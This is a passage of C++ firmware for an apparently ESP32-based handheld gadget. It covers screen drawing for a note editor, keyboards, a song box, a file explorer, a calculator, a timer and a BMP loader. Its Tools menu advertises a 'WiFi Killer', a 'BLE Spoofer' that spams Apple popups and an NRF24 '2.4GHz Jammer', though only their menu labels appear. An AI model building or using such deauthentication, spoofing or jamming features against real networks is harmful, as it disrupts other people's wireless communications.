  if (noteStepCount == 0 || noteCursor >= noteStepCount) return;
  notePitchIndex = noteFindPitchIndex(noteSteps[noteCursor].freq);
  noteDurIndex = noteFindDurIndex(noteSteps[noteCursor].durMs);
}

static String noteBuildPathFromName(const String &name) {
  String n = name;
  if (!n.endsWith(".note")) n += ".note";
  return String("/notes/") + n;
}

static bool noteSaveByName(const String &name) {
  noteEnsureDir();
  String path = noteBuildPathFromName(name);
  File f = LittleFS.open(path, "w");
  if (!f) return false;
  for (uint8_t i = 0; i < noteStepCount; i++) {
    f.print(noteSteps[i].freq);
    f.print(',');
    f.println(noteSteps[i].durMs);
  }
  f.close();
  noteLoadedName = name;
  return true;
}

static bool noteLoadByName(const String &name) {
  String path = noteBuildPathFromName(name);
  File f = LittleFS.open(path, "r");
  if (!f) return false;
  noteStepCount = 0;
  while (f.available() && noteStepCount < NOTE_MAX_STEPS) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) continue;
    int comma = line.indexOf(',');
    if (comma <= 0) continue;
    uint16_t freq = (uint16_t)line.substring(0, comma).toInt();
    uint16_t dur = (uint16_t)line.substring(comma + 1).toInt();
    if (dur == 0) dur = 200;
    noteSteps[noteStepCount].freq = freq;
    noteSteps[noteStepCount].durMs = dur;
    noteStepCount++;
  }
  f.close();
  noteCursor = 0;
  noteLoadedName = name;
  noteSyncPickerFromCursor();
  return true;
}

static void noteStartPlay() {
  if (noteStepCount == 0) return;
  songStop();
  notePlaying = true;
  notePlayIndex = 0;
  noteStepUntilMs = 0;
}

static void noteStopPlay() {
  notePlaying = false;
  buzzerNoTone();
}

static void noteLoop() {
  if (!notePlaying) return;
  uint32_t now = millis();
  if (notePlayIndex >= noteStepCount) {
    noteStopPlay();
    return;
  }
  if (noteStepUntilMs != 0 && now < noteStepUntilMs) return;

  NoteStep s = noteSteps[notePlayIndex];
  if (s.freq > 0) buzzerTone(s.freq, s.durMs);
  else buzzerNoTone();
  noteStepUntilMs = now + s.durMs + 20;
  notePlayIndex++;
}

static void tftDrawWifiKeyboard() {
  tftDrawHeader("WiFi Keyboard");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print(wifiSelectedSsid);
  tft.drawRoundRect(12, 54, 216, 26, 8, UI_LINE);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(18, 58);
  tft.print("Password");
  tft.setTextColor(UI_TEXT);
  tft.setCursor(18, 68);
  String masked = "";
  for (uint16_t i = 0; i < wifiPasswordBuffer.length(); i++) masked += "*";
  if (masked.length() == 0) masked = "(empty)";
  if (masked.length() > 24) masked = "..." + masked.substring(masked.length() - 21);
  tft.print(masked);

  tft.setTextColor(UI_ACCENT);
  tft.setCursor(18, 84);
  tft.print("Mode ");
  if (wifiKeyboardMode == WIFI_KEYS_ALPHA) tft.print(wifiKeyboardShift ? "ABC SHIFT" : "abc");
  else if (wifiKeyboardMode == WIFI_KEYS_NUMBER) tft.print("123");
  else tft.print("SYM");

  const int startX = 12;
  const int totalW = 216;
  const int gap = 3;
  const int rowY[4] = {92, 115, 138, 164};
  const int rowH[4] = {20, 20, 20, 22};
  for (uint8_t row = 0; row < wifiKeyboardRowCount(); row++) {
    uint8_t count = wifiKeyboardRowSize(wifiKeyboardMode, row);
    int keyW = (totalW - gap * ((int)count - 1)) / (int)count;
    for (uint8_t col = 0; col < count; col++) {
      int x = startX + col * (keyW + gap);
      bool selected = (wifiKeyboardRow == row && wifiKeyboardCol == col);
      tft.fillRoundRect(x, rowY[row], keyW, rowH[row], 6, selected ? UI_CARD_SEL : UI_CARD);
      tft.drawRoundRect(x, rowY[row], keyW, rowH[row], 6, selected ? UI_ACCENT : UI_LINE);
      String label = wifiKeyboardLabel(wifiKeyboardMode, wifiKeyboardShift, row, col);
      tft.setTextSize(1);
      tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
      int16_t bx, by;
      uint16_t bw, bh;
      tft.getTextBounds(label, 0, 0, &bx, &by, &bw, &bh);
      int textX = x + ((keyW - (int)bw) / 2);
      if (textX < x + 2) textX = x + 2;
      int textY = rowY[row] + ((rowH[row] - (int)bh) / 2) + 6;
      tft.setCursor(textX, textY);
      tft.print(label);
    }
  }

  if (wifiStatusMessage.length() > 0) {
    tft.setTextSize(1);
    tft.setTextColor(wifiLastConnectOk ? UI_OK : UI_WARN);
    tft.setCursor(14, 198);
    tft.print(wifiStatusMessage);
  } else {
    tft.setTextSize(1);
    tft.setTextColor(UI_MUTED);
    tft.setCursor(14, 198);
    tft.print("U/D:geser - tahan:baris");
    tft.setCursor(14, 212);
    tft.print("OK:key OK+:back");
  }
}

static void tftDrawSongMenu() {
  tftDrawHeader("Song Box");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:pilih - OK:play/stop - OK+:back");
  const char *labels[SONG_ITEM_COUNT] = {"Merry Christmas", "Pirates Theme", "Pink Panther", "Classic Tune", "Play Note File", "Stop Playback"};
  const uint8_t visibleCount = 5;
  uint8_t firstVisible = tftListFirstVisible(songMenuIndex, SONG_ITEM_COUNT, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= SONG_ITEM_COUNT) break;
    int y = 54 + row * 34;
    bool selected = (i == songMenuIndex);
    bool active = false;
    if (i <= SONG_ITEM_CLASSIC) active = songPlaying && currentSong == (SongId)i;
    else if (i == SONG_ITEM_NOTE_FILE) active = notePlaying;
    tft.fillRoundRect(10, y, 212, 28, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(10, y, 212, 28, 8, active ? UI_OK : (selected ? UI_ACCENT : UI_LINE));
    tft.setTextSize(1);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(18, y + 10);
    tft.print(labels[i]);
    String state = (i == SONG_ITEM_STOP) ? ((songPlaying || notePlaying) ? String("READY") : String("IDLE")) : (active ? String("PLAY") : String("OK"));
    tft.setCursor(tftRightAlignTextX(state, 214, 162), y + 10);
    tft.print(state);
  }
  tftDrawListScrollbar(226, 56, 160, SONG_ITEM_COUNT, visibleCount, firstVisible);
}

static void tftDrawToolsMenu() {
  tftDrawHeader("Tools");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:nav - OK:Pilih - OK (hold):back");
  const char *labels[TOOLS_ITEM_COUNT] = {"Calculator", "Stopwatch", "Timer", "Lampu", "WiFi Killer", "Matrix Text", "Note Editor", "File Explorer", "BLE Spoofer", "BLE Monitor", "2.4GHz Jammer"};
  const char *descs[TOOLS_ITEM_COUNT] = {
    "Hitung +/-/*/bagi cepat",
    "Start, pause, reset",
    "Mundur dengan bunyi",
    lampOn ? "LED putih aktif" : "LED putih penerangan",
    "Putus target WiFi",
    "Run/static text matrix",
    "Buat/edit nada buzzer",
    "Kelola file",
    "Spam Apple Popups",
    "Scan + deteksi BLE",
    "NRF24 Multi Jammer"
  };
  const uint8_t visibleCount = 3;
  uint8_t firstVisible = tftListFirstVisible(toolsMenuIndex, TOOLS_ITEM_COUNT, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= TOOLS_ITEM_COUNT) break;
    int y = 62 + row * 52;
    bool selected = (i == toolsMenuIndex);
    tft.fillRoundRect(12, y, 216, 42, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 42, 10, selected ? UI_ACCENT : UI_LINE);
    tft.setTextSize(2);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(22, y + 6);
    tft.print(labels[i]);
    tft.setTextSize(1);
    tft.setCursor(22, y + 24);
    tft.print(descs[i]);
  }
  tftDrawListScrollbar(226, 64, 144, TOOLS_ITEM_COUNT, visibleCount, firstVisible);
}

static void explorerRefresh() {
  explorerFileCount = 0;
  explorerListIndex = 0;
  if (!fsReady) return;

  File root = LittleFS.open("/");
  if (!root || !root.isDirectory()) return;
  root.rewindDirectory();
  File file = root.openNextFile();
  while (file && explorerFileCount < EXPLORER_MAX_FILES) {
    if (!file.isDirectory()) {
      explorerFileNames[explorerFileCount] = String(file.name());
      if (!explorerFileNames[explorerFileCount].startsWith("/")) {
        explorerFileNames[explorerFileCount] = "/" + explorerFileNames[explorerFileCount];
      }
      explorerFileSizes[explorerFileCount] = file.size();
      explorerFileCount++;
    }
    file = root.openNextFile();
  }

  explorerRootCount = explorerFileCount;

  File notesDir = LittleFS.open("/notes");
  if (notesDir && notesDir.isDirectory()) {
    File nf = notesDir.openNextFile();
    while (nf && explorerFileCount < EXPLORER_MAX_FILES) {
      if (!nf.isDirectory()) {
        String path = String(nf.name());
        if (!path.startsWith("/")) path = "/" + path;
        if (!path.startsWith("/notes/")) {
          String base = path;
          int slash = base.lastIndexOf('/');
          if (slash >= 0) base = base.substring(slash + 1);
          path = "/notes/" + base;
        }
        explorerFileNames[explorerFileCount] = path;
        explorerFileSizes[explorerFileCount] = nf.size();
        explorerFileCount++;
      }
      nf = notesDir.openNextFile();
    }
  }
}

static void tftDrawFileExplorer() {
  tftDrawHeader("File Explorer");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  if (!fsReady) {
    tft.print("Storage unavailable");
    tft.setCursor(12, 80);
    tft.setTextColor(UI_WARN);
    tft.print("LittleFS mount failed");
    return;
  }
  uint32_t usedKb = LittleFS.usedBytes() / 1024;
  uint32_t totalKb = LittleFS.totalBytes() / 1024;
  tft.print(String("Storage ") + usedKb + "KB/" + totalKb + "KB");

  if (explorerFileCount == 0) {
    tft.setCursor(12, 80);
    tft.print("Kosong!");
    return;
  }
  const uint8_t visibleCount = 5;
  uint8_t firstVisible = tftListFirstVisible(explorerListIndex, explorerFileCount, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= explorerFileCount) break;
    int y = 56 + row * 28;
    bool selected = (i == explorerListIndex);
    tft.fillRoundRect(12, y, 216, 24, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 24, 8, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setTextSize(1);
    tft.setCursor(18, y + 8);
    // Potong nama file jika terlalu panjang
    String fname = explorerFileNames[i];
    if(fname.length() > 20) fname = fname.substring(0, 17) + "...";
    tft.print(fname);
    tft.setCursor(160, y + 8);
    int kb = explorerFileSizes[i] / 1024;
    if (kb < 1 && explorerFileSizes[i] > 0) tft.print("1 KB");
    else { tft.print(kb); tft.print(" KB"); }
  }
  tftDrawListScrollbar(226, 56, 140, explorerFileCount, visibleCount, firstVisible);
}

static void tftRedrawFileList(uint8_t selectedIndex) {
  if (!fsReady) return;
  if (explorerFileCount == 0) return;
  const uint8_t visibleCount = 5;
  uint8_t firstVisible = tftListFirstVisible(selectedIndex, explorerFileCount, visibleCount);
  // clear only the list area (preserve header)
  tft.fillRect(12, 56, 216, visibleCount * 28, UI_BG);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= explorerFileCount) break;
    int y = 56 + row * 28;
    bool selected = (i == selectedIndex);
    tft.fillRoundRect(12, y, 216, 24, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 24, 8, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setTextSize(1);
    tft.setCursor(18, y + 8);
    String fname = explorerFileNames[i];
    if (fname.length() > 20) fname = fname.substring(0, 17) + "...";
    tft.print(fname);
    tft.setCursor(160, y + 8);
    int kb = explorerFileSizes[i] / 1024;
    if (kb < 1 && explorerFileSizes[i] > 0) tft.print("1 KB");
    else { tft.print(kb); tft.print(" KB"); }
  }
  tftDrawListScrollbar(226, 56, 140, explorerFileCount, visibleCount, firstVisible);
}

static void tftDrawFileAction() {
  tftDrawHeader("File Action");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("Aksi untuk file:");
  tft.setTextColor(UI_TEXT);
  tft.setCursor(10, 52);
  tft.print(explorerFileNames[explorerListIndex]);

  const char *actions[] = {"Back", "View", "Delete"};
  for (uint8_t i = 0; i < 3; i++) {
    int y = 70 + i * 42;
    bool selected = (i == uiIndex);
    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 34, 10, selected ? (i==2 ? tft.color565(255,100,100) : UI_ACCENT) : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setTextSize(2);
    tft.setCursor(24, y + 8);
    tft.print(actions[i]);
  }
}

static void tftDrawFileViewer() {
  tftDrawHeader("File Viewer");
  tft.setTextColor(UI_MUTED);
  tft.setTextSize(1);
  tft.setCursor(10, 40);
  tft.print("U/D:scroll - OK:back");

  const uint8_t visibleLines = 24;
  for (uint8_t i = 0; i < visibleLines; i++) {
    uint8_t idx = fileViewerScrollLines + i;
    if (idx >= fileViewerLineCount) break;
    tft.setCursor(6, 52 + i * 8);
    tft.setTextColor(UI_TEXT);
    tft.print(fileViewerLines[idx]);
  }

  if (fileViewerLineCount > visibleLines) {
    int barH = max(12, (int)(184 * visibleLines / fileViewerLineCount));
    int barY = 52 + (184 - barH) * fileViewerScrollLines / (fileViewerLineCount - visibleLines);
    tft.fillRect(232, 52, 4, 184, UI_LINE);
    tft.fillRect(232, barY, 4, barH, UI_ACCENT);
  }
}

static void tftDrawMatrixTextMenu() {
  tftDrawHeader("Matrix Text");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:pilih - OK:aksi");

  const char* colorNames[] = {"White", "Red", "Green", "Blue", "Yellow", "Purple", "Cyan", "Orange"};
  String colorLabel = String("Color: ") + colorNames[matrixTextColorIdx % 8];

  const char* menus[] = {
    "Play Display", 
    "Edit Text", 
    matrixTextScroll ? "Mode: Running" : "Mode: Static", 
    colorLabel.c_str(),
    "Save (.txt)", 
    "Load (.txt)"
  };
  const uint8_t count = 6;
  const uint8_t visibleCount = 4;
  uint8_t firstVisible = tftListFirstVisible(matrixTextMenuIndex, count, visibleCount);
  
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= count) break;
    int y = 58 + row * 36;
    bool selected = (i == matrixTextMenuIndex);
    tft.fillRoundRect(12, y, 216, 30, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 30, 8, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setTextSize(1);
    tft.setCursor(20, y + 10);
    tft.print(menus[i]);
  }
  tftDrawListScrollbar(226, 56, 140, count, visibleCount, firstVisible);

  tft.fillRect(12, 220, 216, 18, UI_BG);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(12, 224);
  String preview = matrixTextSaved;
  if(preview.length() > 28) preview = preview.substring(0, 25) + "...";
  tft.print(String("Teks: ") + preview);
}

static void tftDrawNoteEditorMenu() {
  tftDrawHeader("Note Editor");
  tft.setTextColor(UI_MUTED);
  tft.setTextSize(1);
  tft.setCursor(10, 40);
  tft.print("U/D:pilih - OK:aksi");

  const char *items[] = {
    "New/Edit Note",
    "Load By Name",
    "Back"
  };
  for (uint8_t i = 0; i < 3; i++) {
    int y = 62 + i * 42;
    bool selected = (noteEditorMenuIndex == i);
    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(22, y + 11);
    tft.print(items[i]);
  }
}

static void tftDrawNoteEditorMain() {
  tftDrawHeader("Note Editor");
  tft.setTextColor(UI_MUTED);
  tft.setTextSize(1);
  tft.setCursor(10, 40);
  tft.print(String("File: ") + noteLoadedName);

  String lines[10] = {
    String("Step: ") + (noteStepCount == 0 ? 0 : (noteCursor + 1)) + "/" + noteStepCount,
    String("Pick Note: ") + notePitchTable[notePitchIndex].name + " (" + notePitchTable[notePitchIndex].freq + "Hz)",
    String("Pick Dur : ") + noteDurTable[noteDurIndex] + " ms",
    "Add Step (from picker)",
    "Apply Picker -> Step",
    "Delete Step",
    notePlaying ? "Stop Play" : "Play Sequence",
    "Save As",
    "Load By Name",
    "Clear All"
  };

  const uint8_t visibleCount = 5;
  uint8_t firstVisible = tftListFirstVisible(noteEditorMenuIndex, 10, visibleCount);
  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= 10) break;
    int y = 58 + row * 34;
    bool selected = (noteEditorMenuIndex == i);
    tft.fillRoundRect(12, y, 216, 28, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 28, 8, selected ? UI_ACCENT : UI_LINE);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(20, y + 9);
    tft.print(lines[i]);
  }
  tftDrawListScrollbar(226, 58, 170, 10, visibleCount, firstVisible);

  if (noteStepCount > 0 && noteCursor < noteStepCount) {
    tft.setTextColor(UI_MUTED);
    tft.setCursor(12, 232);
    uint8_t pidx = noteFindPitchIndex(noteSteps[noteCursor].freq);
    tft.print(String("Current: ") + notePitchTable[pidx].name + " / " + noteSteps[noteCursor].durMs + "ms");
  }
}

static void tftDrawTextKeyboard() {
  tftDrawHeader("Text Input");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("Input tulisan:");
  tft.drawRoundRect(12, 54, 216, 26, 8, UI_LINE);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(18, 62);
  
  String txt = textKeyboardBuffer;
  if (txt.length() > 28) txt = "..." + txt.substring(txt.length() - 25);
  if (txt.length() == 0) { tft.setTextColor(UI_MUTED); txt = "(kosong)"; }
  tft.print(txt);

  tft.setTextColor(UI_ACCENT);
  tft.setCursor(18, 84);
  tft.print("Mode ");
  if (textKeyboardMode == WIFI_KEYS_ALPHA) tft.print(textKeyboardShift ? "ABC SHIFT" : "abc");
  else if (textKeyboardMode == WIFI_KEYS_NUMBER) tft.print("123");
  else tft.print("SYM");

  for (uint8_t row = 0; row < 4; row++) {
    uint8_t cols = (row == 3) ? 4 : 10;
    int y = 96 + row * 28;
    for (uint8_t col = 0; col < cols; col++) {
      int x = 12 + col * 22;
      int w = 18;
      if (row == 3) {
        if (col == 0) { x = 12; w = 40; }
        else if (col == 1) { x = 56; w = 40; }
        else if (col == 2) { x = 100; w = 62; }
        else if (col == 3) { x = 166; w = 62; }
      }
      bool selected = (row == textKeyboardRow && col == textKeyboardCol);
      tft.fillRoundRect(x, y, w, 24, 6, selected ? UI_CARD_SEL : UI_CARD);
      tft.drawRoundRect(x, y, w, 24, 6, selected ? UI_ACCENT : UI_LINE);
      tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
      tft.setCursor(x + (w / 2) - 3, y + 8);
      String label = wifiKeyboardLabel(textKeyboardMode, textKeyboardShift, row, col); // Reusing label generator
      if (label == "Aa" || label == "12" || label == "#=") {
        tft.setCursor(x + 10, y + 8);
        tft.print(label);
      } else if (label == "DEL") {
        tft.setCursor(x + 10, y + 8);
        tft.print("DEL");
      } else if (label == "SPC") {
        tft.setCursor(x + 22, y + 8);
        tft.print("SPC");
      } else if (label == "ENTR") {
        tft.setCursor(x + 16, y + 8);
        tft.print("ENTR");
      } else {
        tft.print(label);
      }
    }
  }
}


static const char *calcOpText(uint8_t op) {
  switch (op & 0x03) {
    case 0: return "+";
    case 1: return "-";
    case 2: return "*";
    default: return "/";
  }
}

static int32_t calcResult() {
  switch (calcState.op & 0x03) {
    case 0: return (int32_t)calcState.left + (int32_t)calcState.right;
    case 1: return (int32_t)calcState.left - (int32_t)calcState.right;
    case 2: return (int32_t)calcState.left * (int32_t)calcState.right;
    default: return (calcState.right == 0) ? 0 : ((int32_t)calcState.left / (int32_t)calcState.right);
  }
}

static String formatStopwatchMs(uint32_t ms) {
  uint32_t centis = (ms / 10) % 100;
  uint32_t seconds = (ms / 1000) % 60;
  uint32_t minutes = (ms / 60000) % 100;
  char buf[16];
  snprintf(buf, sizeof(buf), "%02lu:%02lu.%02lu", (unsigned long)minutes, (unsigned long)seconds, (unsigned long)centis);
  return String(buf);
}

static void calcAdjustValue(int delta) {
  if (calcState.field == 0) calcState.left = constrain(calcState.left + delta, -999, 999);
  else if (calcState.field == 1) calcState.op = (uint8_t)((calcState.op + (delta > 0 ? 1 : 3)) & 0x03);
  else calcState.right = constrain(calcState.right + delta, -999, 999);
}

static void tftDrawCalcTool() {
  tftDrawHeader("Calculator");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:ubah OK:field OK+:back");
  const char *fieldNames[3] = {"A", "OP", "B"};
  String fieldValues[3] = {String(calcState.left), String(calcOpText(calcState.op)), String(calcState.right)};
  for (uint8_t i = 0; i < 3; i++) {
    int x = 14 + i * 72;
    bool selected = (calcState.field == i);
    tft.fillRoundRect(x, 72, 64, 54, 8, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(x, 72, 64, 54, 8, selected ? UI_ACCENT : UI_LINE);
    tft.setTextSize(1);
    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
    tft.setCursor(x + 8, 82);
    tft.print(fieldNames[i]);
    tft.setTextSize(2);
    tft.setCursor(x + 10, 100);
    tft.print(fieldValues[i]);
  }
  tft.drawRoundRect(16, 146, 208, 52, 10, UI_OK);
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(28, 156);
  tft.print("Result");
  tft.setTextSize(3);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(28, 168);
  if ((calcState.op & 0x03) == 3 && calcState.right == 0) tft.print("ERR");
  else tft.print(calcResult());
}

static void tftDrawStopwatchTool() {
  tftDrawHeader("Stopwatch");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("OK:start/pause UP:reset OK+:back");
  uint32_t elapsed = stopwatchState.accumulatedMs;
  if (stopwatchState.running) elapsed += millis() - stopwatchState.startedMs;
  tft.drawRoundRect(16, 74, 208, 72, 12, UI_LINE);
  tft.setTextSize(4);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(28, 96);
  tft.print(formatStopwatchMs(elapsed));
  tft.setTextSize(2);
  tft.setTextColor(stopwatchState.running ? UI_OK : UI_WARN);
  tft.setCursor(70, 168);
  tft.print(stopwatchState.running ? "RUNNING" : "PAUSED");
}

static void tftDrawTimerTool() {
  tftDrawHeader("Timer");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:set - OK:start/pause - UP:reset");
  uint16_t secs = timerState.running ? timerState.remainingSeconds : timerState.setSeconds;
  uint8_t mins = secs / 60;
  uint8_t rem = secs % 60;
  char buf[8];
  snprintf(buf, sizeof(buf), "%02u:%02u", mins, rem);
  tft.drawRoundRect(16, 72, 208, 78, 12, UI_LINE);
  tft.setTextSize(5);
  tft.setTextColor(timerState.finished ? UI_WARN : UI_TEXT);
  tft.setCursor(42, 94);
  tft.print(buf);
  tft.setTextSize(2);
  tft.setCursor(52, 170);
  if (timerState.finished) {
    tft.setTextColor(UI_WARN);
    tft.print("TIMER DONE");
  } else {
    tft.setTextColor(timerState.running ? UI_OK : UI_MUTED);
    tft.print(timerState.running ? "COUNTING" : "READY");
  }
}

static void tftDrawLampTool() {
  tftDrawHeader("Lampu");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("OK:nyala/mati OK+:back");
  tft.drawRoundRect(16, 70, 208, 86, 12, lampOn ? UI_OK : UI_LINE);
  tft.setTextSize(2);
  tft.setTextColor(lampOn ? UI_OK : UI_WARN);
  tft.setCursor(78, 88);
  tft.print(lampOn ? "LAMP ON" : "LAMP OFF");
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(40, 116);
  tft.print("White LED @ safe brightness");
  tft.setCursor(76, 132);
  tft.print(String(LAMP_SAFE_BRIGHTNESS) + "/255");
  tft.drawRoundRect(44, 176, 152, 28, 10, UI_ACCENT);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(60, 186);
  tft.print("OK to toggle");
}

static void lampSetEnabled(bool on) {
  if (lampOn == on) return;
  if (on) {
    memcpy(lampSceneBackup, Matrix_Color, sizeof(Matrix_Color));
    lampSceneSaved = true;
    lampBrightnessBefore = gBrightness;
    lampIdleDirtyBefore = matrixIdleDirty;
    gBrightness = LAMP_SAFE_BRIGHTNESS;
    brightnessDirty = true;
    matrixFillAll(CRGB::White);
    matrixIdleDirty = false;
    matrixCommitToPixels();
    matrixDirty = false;
    lampOn = true;
  } else {
    if (lampSceneSaved) memcpy(Matrix_Color, lampSceneBackup, sizeof(Matrix_Color));
    gBrightness = lampBrightnessBefore;
    brightnessDirty = true;
    matrixIdleDirty = lampIdleDirtyBefore;
    matrixDirty = true;
    matrixCommitToPixels();
    matrixDirty = false;
    lampOn = false;
    lampSceneSaved = false;
  }
}

static void tftDrawValueScreen(const char *title, const String &value, int barValue, int vmin, int vmax) {
  tftDrawHeader(title);
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(5);
  tft.setCursor(20, 82);
  tft.print(value);
  int barX = 20, barY = 160, barW = 200, barH = 16;
  tft.drawRoundRect(barX, barY, barW, barH, 8, UI_LINE);
  int fillW = map(barValue, vmin, vmax, 0, barW - 4);
  fillW = constrain(fillW, 0, barW - 4);
  tft.fillRoundRect(barX + 2, barY + 2, fillW, barH - 4, 6, UI_OK);
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(20, 192);
  tft.print("U/D:ubah - OK:simpan - OK+:back");
}

static void tftDrawUtcScreen() {
  tftDrawHeader("UTC Offset");
  int off = (int)kUtcOffsetsMin[uiOffsetIdx];
  char sign = (off >= 0) ? '+' : '-';
  int absMin = abs(off);
  char buf[12];
  snprintf(buf, sizeof(buf), "%c%02d:%02d", sign, absMin / 60, absMin % 60);
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(5);
  tft.setCursor(26, 86);
  tft.print(buf);
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(20, 170);
  tft.print("U/D:pilih zona");
  tft.setCursor(20, 188);
  tft.print("OK:simpan OK+:back");
}

static void tftDrawFooterIp() {
  tft.fillRect(0, 224, 240, 16, UI_BG);
  tft.drawFastHLine(10, 223, 220, UI_LINE);
  tft.setTextSize(1);
  tft.setTextColor(UI_ACCENT);
  tft.setCursor(10, 228);
  if (wifiLimitedMode) {
    tft.print("OFFLINE LIMITED");
  } else {
    tft.print("IP ");
    if (WiFi.isConnected()) tft.print(WiFi.localIP());
    else tft.print("not connected");
  }
}

static bool bmpGetSize(const char *path, int16_t &width, int16_t &height) {
  width = 0;
  height = 0;
  File bmpFile = LittleFS.open(path, "r");
  if (!bmpFile) return false;
  auto read16 = [&](File &f) -> uint16_t {
    uint16_t result;
    ((uint8_t *)&result)[0] = f.read();
    ((uint8_t *)&result)[1] = f.read();
    return result;
  };
  auto read32 = [&](File &f) -> uint32_t {
    uint32_t result;
    ((uint8_t *)&result)[0] = f.read();
    ((uint8_t *)&result)[1] = f.read();
    ((uint8_t *)&result)[2] = f.read();
    ((uint8_t *)&result)[3] = f.read();
    return result;
  };
  if (read16(bmpFile) != 0x4D42) { bmpFile.close(); return false; }
  (void)read32(bmpFile);
  (void)read32(bmpFile);
  (void)read32(bmpFile);
  uint32_t headerSize = read32(bmpFile);
  int32_t bmpWidth = (int32_t)read32(bmpFile);
  int32_t bmpHeight = (int32_t)read32(bmpFile);
  bmpFile.close();
  if (headerSize < 40 || bmpWidth <= 0 || bmpHeight == 0) return false;
  width = (int16_t)bmpWidth;
  height = (int16_t)abs(bmpHeight);
  return true;
}

static bool tftDrawBmpFromFS(const char *path, int16_t x, int16_t y) {
  File bmpFile = LittleFS.open(path, "r");
  if (!bmpFile) return false;
  auto read16 = [&](File &f) -> uint16_t {
    uint16_t result;
    ((uint8_t *)&result)[0] = f.read();
    ((uint8_t *)&result)[1] = f.read();
    return result;
  };
  auto read32 = [&](File &f) -> uint32_t {
    uint32_t result;
    ((uint8_t *)&result)[0] = f.read();
    ((uint8_t *)&result)[1] = f.read();
    ((uint8_t *)&result)[2] = f.read();
    ((uint8_t *)&result)[3] = f.read();
    return result;
  };
  if (read16(bmpFile) != 0x4D42) { bmpFile.close(); return false; }
  (void)read32(bmpFile);
  (void)read32(bmpFile);
  uint32_t bmpImageOffset = read32(bmpFile);
  uint32_t headerSize = read32(bmpFile);
  int32_t bmpWidth = (int32_t)read32(bmpFile);
  int32_t bmpHeight = (int32_t)read32(bmpFile);
  if (read16(bmpFile) != 1) { bmpFile.close(); return false; }
  uint16_t bmpDepth = read16(bmpFile);
  uint32_t bmpCompression = read32(bmpFile);
  if (headerSize < 40 || bmpDepth != 24 || bmpCompression != 0) { bmpFile.close(); return false; }
  bool flip = true;
  if (bmpHeight < 0) { bmpHeight = -bmpHeight; flip = false; }
  uint32_t rowSize = (bmpWidth * 3 + 3) & ~3;
  int16_t w = (int16_t)bmpWidth;
  int16_t h = (int16_t)bmpHeight;
  if ((x + w - 1) >= tft.width()) w = tft.width() - x;
  if ((y + h - 1) >= tft.height()) h = tft.height() - y;
